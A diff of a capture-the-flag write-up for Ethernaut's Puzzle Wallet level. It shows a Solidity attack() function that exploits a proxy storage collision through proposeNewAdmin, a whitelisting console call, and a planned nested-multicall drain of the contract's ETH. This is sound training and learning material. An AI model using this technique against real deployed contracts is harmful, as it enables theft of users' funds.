@@ -123,6 +123,8 @@ This function has a simple flag check in it, only allowing one call to the depos
 
 After this exploit, I can retrieve all eth from the contract and set maxBalance to my address. This makes me the admin of the proxy - task solved 👍. Technically I switched between solidity remix and web3 calls, here my implementation:
 
+First I check the abi interface of the ethernaut proxy:
+
 ````apache
 1. Get owner of the implementation
 contract.abi
@@ -140,29 +142,26 @@ Array(10) [ {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}
 ```
 ````
 
-Unfortunately the method proposeNew admin is not there, I switched therefore to Remix, and with this I was the owner.
+Unfortunately the function proposeNewadmin is not there, I switched therefore to Remix to make me owner of the implementation:
 
-```apache
     address public proxy = 0x1;
     address public wallet = 0x1;
 
-   function attack() public {
-       bytes memory calldatas = abi.encodeWithSignature("proposeNewAdmin(address)",msg.sender);
-       (bool success, ) = proxy.call(calldatas);
-       if(!success){
-           revert();
-       }
-   }
-```
-
-As immediate next step I whitelist me throught the browser console, so I am allowed to interact with the contract and fulfill the require from the onlyWhitelisted modifier.
+function attack() public {
+bytes memory calldatas = abi.encodeWithSignature("proposeNewAdmin(address)",msg.sender);
+(bool success, ) = proxy.call(calldatas);
+if(!success){
+revert();
+}
+}
+As immediate next step I whitelist me throught the browser console, so I am allowed to interact with the contract and fulfill the require check of the onlyWhitelisted modifier.
 
 ```àppache
 // whitelist the owner
 await contract.addToWhitelist(player)
 ```
 
-After this task, I am the owner of the implementation contract but now the admin of the proxy. For this the next step is to drain all eth out of the contract with a nested multicall.
+After this task, I am the whitelisted owner of the implementation contract but not the admin of the proxy. For this the next step is to drain all eth out of the contract with a nested multicall and execute.
 
 ```apache
 // set the deposit function selector
